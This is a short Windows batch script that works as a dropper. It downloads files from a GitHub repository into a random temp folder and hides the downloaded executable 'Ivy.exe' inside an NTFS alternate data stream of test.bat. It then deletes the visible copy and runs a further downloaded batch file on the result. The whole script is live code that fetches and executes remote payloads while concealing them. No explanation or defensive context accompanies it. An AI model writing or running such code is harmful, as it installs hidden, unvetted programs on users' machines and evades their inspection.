@echo off
cd %temp%
set /a num=%random%
mkdir %num% && cd %num%
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/test.bat' -OutFile 'test.bat'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/Ivy.exe' -OutFile 'Ivy.exe'"
powershell -command " & {(Get-Content %CD%\Ivy.exe -Raw | Set-Content %CD%\test.bat -Stream file.exe)}"
del %CD%\Ivy.exe
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/file.bat' -OutFile 'file.bat'"
%CD%\file.bat %CD%\test.bat
